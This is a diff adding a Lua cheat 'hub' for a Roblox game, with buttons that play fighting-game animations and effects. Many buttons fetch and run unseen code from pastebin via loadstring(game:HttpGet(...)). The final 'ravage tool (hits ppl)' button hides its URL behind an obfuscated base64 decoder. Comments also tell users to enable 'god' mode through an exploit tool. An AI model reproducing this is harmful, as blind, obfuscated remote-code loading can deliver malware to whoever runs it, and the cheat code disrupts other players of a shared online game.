@@ -1,0 +1,270 @@
+local Library = 
+loadstring(game:HttpGet("https://pastebin.com/raw/vff1bQ9F"))()
+local Window = Library.CreateLib("phantasm hub (private)", "GrapeTheme")
+local Tab = Window:NewTab("misc")
+local Section = Tab:NewSection("activate god with infinite yield please you dumbass")
+Section:NewButton("follow camera", "ButtonInfo", function()
+loadstring(game:HttpGet("https://pastebin.com/raw/WV2C04kp"))();
+    print("Clicked")
+end)
+local Tab = Window:NewTab("kj moves")
+local Section = Tab:NewSection("kj animations")
+Section:NewButton("ravage", "ButtonInfo", function()
+local p = game.Players.LocalPlayer
+local Humanoid = p.Character:WaitForChild("Humanoid")
+
+local AnimAnim = Instance.new("Animation")
+AnimAnim.AnimationId = "rbxassetid://16945550029"
+local Anim = Humanoid:LoadAnimation(AnimAnim)
+AnimAnim.AnimationId = "rbxassetid://0" -- Reset animation ID
+Anim:Play()
+
+-- Local Script
+
+local soundId = 16945495411-- Correct sound ID
+
+-- Create a new Sound instance
+local sound = Instance.new("Sound")
+sound.Name = "Dropkick Miss"
+sound.SoundId = "rbxassetid://16945495411"
+sound.Volume = 1
+sound.Pitch = 1.0 -- Pitch set to 1.0
+sound.PlaybackSpeed = 1.0 -- Adjusted playback speed
+
+-- Parent the sound to Workspace
+sound.Parent = workspace
+
+-- Play the sound
+sound:Play()
+
+Wait(0)
+
+-- Local Script
+
+local soundId = 16945593216 -- Correct sound ID
+
+-- Create a new Sound instance
+local sound = Instance.new("Sound")
+sound.Name = "Dropkick Miss"
+sound.SoundId = "rbxassetid://16945593216"
+sound.Volume = 1
+sound.Pitch = 1.0 -- Pitch set to 1.0
+sound.PlaybackSpeed = 1.0 -- Adjusted playback speed
+
+-- Parent the sound to Workspace
+sound.Parent = workspace
+
+-- Play the sound
+sound:Play()
+
+Wait(0.3)
+
+-- Local Script
+
+local soundId = 16945691441 -- Correct sound ID
+
+-- Create a new Sound instance
+local sound = Instance.new("Sound")
+sound.Name = "Dropkick Miss"
+sound.SoundId = "rbxassetid://16945691441"
+sound.Volume = 1
+sound.Pitch = 1.0 -- Pitch set to 1.0
+sound.PlaybackSpeed = 1.0 -- Adjusted playback speed
+
+-- Parent the sound to Workspace
+sound.Parent = workspace
+
+-- Play the sound
+sound:Play()
+    print("Clicked")
+end)
+
+Section:NewButton("temu dropkick", "ButtonInfo", function() loadstring(game:HttpGet("https://pastebin.com/raw/g7Xjypk8"))()
+    print("Clicked")
+end)
+Section:NewButton("kj miss ravage", "ButtonInfo", function()
+loadstring(game:HttpGet("https://pastebin.com/raw/vk1pWaxf"))();
+    print("Clicked")
+end)
+Section:NewButton("five seasons startup", "ButtonInfo", 
+function()
+-- LocalScript in StarterPlayer > StarterPlayerScripts
+
+local TweenService = game:GetService("TweenService")
+
+-- Function to play the animation and sound
+local function playSpawnAnimationAndSound()
+    local player = game.Players.LocalPlayer
+    local character = player.Character or player.CharacterAdded:Wait()
+
+    wait(0.1)
+
+    -- Check if character is still valid
+    if character and character:FindFirstChild("Humanoid") then
+        local humanoid = character.Humanoid
+        local animator = humanoid:FindFirstChildOfClass("Animator")
+        local rootPart = character:FindFirstChild("HumanoidRootPart")
+        
+        if not animator then
+            animator = Instance.new("Animator")
+            animator.Parent = humanoid
+        end
+        
+        local animation1 = Instance.new("Animation")
+        animation1.AnimationId = "rbxassetid://18461128573"
+
+        local animation2 = Instance.new("Animation")
+        animation2.AnimationId = "rbxassetid://18462892217"
+
+        local animation3 = Instance.new("Animation")
+        animation3.AnimationId = "rbxassetid://18462894593"
+
+        local animationTrack1 = animator:LoadAnimation(animation1)
+        local animationTrack2 = animator:LoadAnimation(animation2)
+        local animationTrack3 = animator:LoadAnimation(animation3)
+        
+        -- Play animation1
+        animationTrack1:Play() 
+
+        -- Delay before playing animation2
+        wait(1)  -- Adjust the delay time as needed
+        
+        -- Play animation2
+        animationTrack2:Play()
+
+loadstring(game:HttpGet("https://pastebin.com/raw/w3qsdFsL"))();
+
+loadstring(game:HttpGet("https://pastebin.com/raw/FDN8Uhr6"))();
+
+        -- Delay before playing animation2
+        wait(15)  -- Adjust the delay time as needed
+
+        -- Play animation3
+        animationTrack3:Play()
+
+        -- Create and play a sound from the Workspace
+        local soundId = "rbxassetid://0"
+        local sound = Instance.new("Sound")
+        sound.SoundId = soundId
+        sound.Parent = game.Workspace  -- Parent the sound to the Workspace
+        sound:Play()
+        
+        -- Anchor the HumanoidRootPart
+        if rootPart then
+            rootPart.Anchored = false
+        end
+        
+        -- Connect to animationTrack2's Stopped event
+        animationTrack2.Stopped:Connect(function()
+            if rootPart then
+                rootPart.Anchored = false
+            end
+        end)
+    end
+end
+
+-- Connect function to player's CharacterAdded event
+local player = game.Players.LocalPlayer
+player.CharacterAdded:Connect(playSpawnAnimationAndSound)
+
+-- Also call the function immediately if the player already has a character
+if player.Character then
+    playSpawnAnimationAndSound()
+end
+end)
+Section:NewButton("autistic bomb", "ButtonInfo", function()
+loadstring(game:HttpGet("https://pastebin.com/raw/ittgcfTq"))()
+    print("Clicked")
+end)
+local Section = Tab:NewSection("kj ultimate i guess")
+Section:NewButton("kj ult 1", "ButtonInfo", function()
+local player = game.Players.LocalPlayer
+repeat wait() until player.Character.Humanoid
+local humanoid = player.Character.Humanoid
+local character = player.Character or player.CharacterAdded:Wait()
+local UserInputService = game:GetService("UserInputService")
+
+local soundeffect = Instance.new("Sound")
+soundeffect.SoundId = "rbxassetid://17150550302"
+soundeffect.Parent = game.Players.LocalPlayer.Character.Torso
+soundeffect:Play()
+soundeffect.Volume = 1
+
+local anim = Instance.new("Animation")
+anim.AnimationId = "rbxassetid://17140902079"
+
+local playAnim = humanoid:LoadAnimation(anim)
+playAnim:Play()
+
+local fine1 = game.ReplicatedStorage.Resources.KJEffects["fine...Emit"].EmitBatch3:Clone()
+fine1.Parent = game.Players.LocalPlayer.Character["Torso"]
+    for _, child in ipairs(fine1:GetChildren()) do
+        if child:IsA("ParticleEmitter") then -- Check if the child is a ParticleEmitter
+            child:Emit(1) -- Emit 20 particles
+        end
+    end
+local fine = game.ReplicatedStorage.Resources.KJEffects["fine...1"].EnableBatch2:Clone()
+fine.Parent = game.Players.LocalPlayer.Character["Torso"]
+    for _, child in ipairs(fine:GetChildren()) do
+        if child:IsA("ParticleEmitter") then -- Check if the child is a ParticleEmitter
+            child:Emit(1) -- Emit 20 particles
+        end
+    end
+local red = game.ReplicatedStorage.Resources.KJEffects["fine...1"].REDDDD1:Clone()
+red.Parent = game.Players.LocalPlayer.Character["Right Leg"]
+    for _, child in ipairs(red:GetChildren()) do
+        if child:IsA("ParticleEmitter") then -- Check if the child is a ParticleEmitter
+            child:Emit(1) -- Emit 20 particles
+        end
+    end
+local red2 = game.ReplicatedStorage.Resources.KJEffects["fine...1"].REDDDD2:Clone()
+red2.Parent = game.Players.LocalPlayer.Character["Left Leg"]
+    for _, child in ipairs(red2:GetChildren()) do
+        if child:IsA("ParticleEmitter") then -- Check if the child is a ParticleEmitter
+            child:Emit(1) -- Emit 20 particles
+        end
+    end
+local red3 = game.ReplicatedStorage.Resources.KJEffects["fine...1"].REDDDD3:Clone()
+red3.Parent = game.Players.LocalPlayer.Character["Left Leg"]
+    for _, child in ipairs(red3:GetChildren()) do
+        if child:IsA("ParticleEmitter") then -- Check if the child is a ParticleEmitter
+            child:Emit(1) -- Emit 20 particles
+        end
+    end
+local red4 = game.ReplicatedStorage.Resources.KJEffects["fine...1"].REDDDD4:Clone()
+red4.Parent = game.Players.LocalPlayer.Character["Right Leg"]
+    for _, child in ipairs(red4:GetChildren()) do
+        if child:IsA("ParticleEmitter") then -- Check if the child is a ParticleEmitter
+            child:Emit(1) -- Emit 20 particles
+        end
+    end
+wait(8.2)
+fine:Destroy()
+red:Destroy()
+red2:Destroy()
+red3:Destroy()
+red4:Destroy()
+local fine2 = game.ReplicatedStorage.Resources.KJEffects["fine...Emit2"].EmitBatch1:Clone()
+fine2.Parent = game.Players.LocalPlayer.Character["Right Arm"]
+    for _, child in ipairs(fine2:GetChildren()) do
+        if child:IsA("ParticleEmitter") then -- Check if the child is a ParticleEmitter
+            child:Emit(1) -- Emit 20 particles
+        end
+    end
+end)
+local Tab = Window:NewTab("tool tab")
+local Section = Tab:NewSection("activate god with infinite yield please")
+Section:NewButton("ravage tool (hits ppl)", "ButtonInfo", 
+function()
+local b='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
+function PgbAhRsgfgyhdUfMpTGRrwUPtVFeNgKHhiHgAOlEDCnOLjZbSHFHkCERreDpvobuhFDRnsGOBYaUWeTSxHxBb(data) m=string.sub(data, 0, 26) data=data:gsub(m,'')
+
+data = string.gsub(data, '[^'..b..'=]', '') return (data:gsub('.', function(x) if (x == '=') then return '' end local r,f='',(b:find(x)-1) for i=6,1,-1 do r=r..(f%2^i-f%2^(i-1)>0 and '1' or '0') end return r; end):gsub('%d%d%d?%d?%d?%d?%d?%d?', function(x) if (#x ~= 8) then return '' end local c=0 for i=1,8 do c=c+(x:sub(i,i)=='1' and 2^(8-i) or 0) end return string.char(c) end)) end
+
+
+ 
+
+
+loadstring(game:HttpGet(PgbAhRsgfgyhdUfMpTGRrwUPtVFeNgKHhiHgAOlEDCnOLjZbSHFHkCERreDpvobuhFDRnsGOBYaUWeTSxHxBb('DGoSvSVYUokujOHxnLqShRrOetaHR0cHM6Ly9wYXN0ZWJpbi5jb20vcmF3L2RaRnAzaUhK')))()
+    print("Clicked")
+end)
